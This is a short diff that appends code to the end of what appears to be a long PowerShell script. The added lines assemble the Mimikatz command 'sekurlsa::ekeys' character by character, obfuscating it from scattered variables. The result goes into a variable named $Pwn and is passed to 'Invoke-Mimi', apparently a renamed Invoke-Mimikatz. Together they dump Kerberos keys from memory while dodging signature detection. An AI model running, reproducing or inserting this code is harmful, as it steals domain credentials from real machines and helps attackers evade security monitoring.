@@ -2567,3 +2567,21 @@ Function Main
 
 Main
 }
+
+$8 = "s";
+$c = "e";
+$g = "k";
+$t = "u";
+$p = "r";
+$n = "l";
+$7 = "s";
+$6 = "a";
+$l = ":";
+$2 = ":";
+$z = "e";
+$e = "k";
+$0 = "e";
+$s = "y";
+$1 = "s";
+$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 ;
+Invoke-Mimi -Command $Pwn
